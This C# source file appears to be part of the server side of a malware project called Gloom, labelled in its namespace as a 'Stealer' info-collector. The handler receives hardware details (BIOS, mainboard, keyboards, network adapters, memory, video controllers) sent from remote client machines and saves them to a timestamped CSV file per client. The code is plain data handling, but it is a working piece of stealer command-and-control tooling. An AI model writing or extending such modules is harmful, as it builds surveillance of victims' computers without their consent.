using CsvHelper;
using Gloom.WmiOps;
using Serilog;
using System.Globalization;
using System.Text;

namespace Gloom.Server.Features.Stealer.InfoCollector.Wmi;
internal class WmiHardwareInfo : WmiInfo
{
	public WmiHardwareInfo() : base("hw", WmiOpCodes.HardwareInfo)
	{
	}

	public override async Task Handle(string from, byte[] data)
	{
		var rsp = StructConvert.Bytes2Struct<HardwareInfoResponse>(data);
		var fileName = $"Hardware information of {from.Replace(':', '#')} at {DateTime.Now:yyyy-MM-dd-HH-mm-ss-ffff}.csv";
		try
		{
			using var fw = new StreamWriter(fileName, false, new UTF8Encoding(false), 8192);

			fw.WriteLine("BIOS:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				csv.WriteRecord(rsp.Bios);

			fw.WriteLine("Mainboard:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				csv.WriteRecord(rsp.BaseBoard);

			fw.WriteLine("Keyboards:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				await csv.WriteRecordsAsync(rsp.Keyboards);

			fw.WriteLine("Network Adapter:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				await csv.WriteRecordsAsync(rsp.NetworkAdapters);

			fw.WriteLine("Physical Memory:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				await csv.WriteRecordsAsync(rsp.PhysicalMemories);

			fw.WriteLine("Pointing Device:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				await csv.WriteRecordsAsync(rsp.PointingDevices);

			fw.WriteLine("Video Controller:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				await csv.WriteRecordsAsync(rsp.VideoControllers);

			Log.Information("Hardware info of {client} written to {path}.", from, fileName);
		}
		catch (Exception ex)
		{
			Log.Error(ex, "Exception during handling of wmi hadware info response.");
		}
	}
}
